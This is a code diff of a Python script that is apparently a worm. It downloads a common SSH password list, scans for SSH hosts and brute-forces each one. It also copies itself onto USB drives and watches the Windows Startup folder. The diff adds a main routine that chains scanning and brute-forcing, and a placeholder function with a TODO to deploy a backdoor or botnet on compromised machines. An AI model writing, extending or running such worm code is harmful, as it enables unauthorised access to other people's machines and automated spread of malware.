@@ -93,7 +93,7 @@ def download_ssh_passwords(filename):
         filename - Name to save the file as.
     """
 
-    # TODO: Move these passwords to my own website.
+    # TODO: This wordlist contains only few passwords. You would need a bigger one for real bruteforcing. \_(OwO)_/
 
     logger.debug("Downloading passwords...")
     url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"
@@ -163,7 +163,7 @@ def bruteforce_ssh(host, wordlist):
 
         
 def usbspreading():
-
+    # TODO : Make this threaded.
     bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
 
     while True:
@@ -177,4 +177,17 @@ def usbspreading():
                 copy2(__file__, drive)
         time.sleep(3)
 
-usbspreading()
+
+def deploybackdoor():
+    # TODO : Add a backdoor/botnet/code that will be executed on these machines.
+    pass
+
+
+def main():
+    download_ssh_passwords("passwords.txt")
+    for host in scan_ssh_hosts():
+        bruteforce_ssh(host, "passwords.txt")
+
+
+if __name__ == "__main__":
+    main()
